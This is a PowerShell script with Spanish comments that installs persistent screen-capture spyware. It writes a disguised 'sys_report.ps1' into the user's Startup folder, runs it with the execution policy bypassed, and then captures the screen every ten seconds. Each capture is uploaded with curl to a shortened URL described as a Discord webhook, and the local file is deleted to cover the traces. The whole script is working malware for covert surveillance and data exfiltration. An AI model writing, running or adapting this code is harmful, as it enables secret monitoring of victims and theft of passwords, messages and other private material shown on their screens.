# Definir la URL del webhook de Discord
$hookurl = "https://is.gd/xSsigk"  # Reemplaza "URL_DEL_WEBHOOK" con la URL de tu webhook de Discord

# Definir el contenido del script
$scriptContent = @"
`$hookurl = "$hookurl"
`$seconds = 10 # Intervalo de captura de pantalla en segundos

# Bucle infinito para tomar capturas de pantalla continuamente
while (`$true) {
    `$Filett = "$env:temp\SC_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"  # Ruta del archivo de la captura de pantalla
    
    # Obtiene las dimensiones de la pantalla virtual
    `$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    `$Width = `$Screen.Width
    `$Height = `$Screen.Height
    `$Left = `$Screen.Left
    `$Top = `$Screen.Top
    
    # Crea un objeto Bitmap y copia la pantalla en él
    `$bitmap = New-Object System.Drawing.Bitmap `$Width, `$Height
    `$graphic = [System.Drawing.Graphics]::FromImage(`$bitmap)
    `$graphic.CopyFromScreen(`$Left, `$Top, 0, 0, `$bitmap.Size)
    
    # Guarda la captura de pantalla como un archivo PNG
    `$bitmap.Save(`$Filett, [System.Drawing.Imaging.ImageFormat]::png)
    
    # Envía la captura de pantalla al webhook de Discord
    curl.exe -F "file1=@`$Filett" `$hookurl
    
    # Elimina el archivo de la captura de pantalla
    Remove-Item -Path `$Filett
    
    # Espera el intervalo de tiempo especificado antes de tomar otra captura de pantalla
    Start-Sleep -Seconds `$seconds
}
"@

# Definir la ruta de la carpeta de inicio del usuario actual
$startupFolder = [Environment]::GetFolderPath("Startup")

# Definir la ruta completa del script en la carpeta de inicio
$scriptPath = Join-Path -Path $startupFolder -ChildPath "sys_report.ps1"

# Guardar el script en la carpeta de inicio del usuario actual
$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8 -Force

# Ejecutar el script automáticamente al iniciar sesión
# Esto no requerirá permisos adicionales
Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
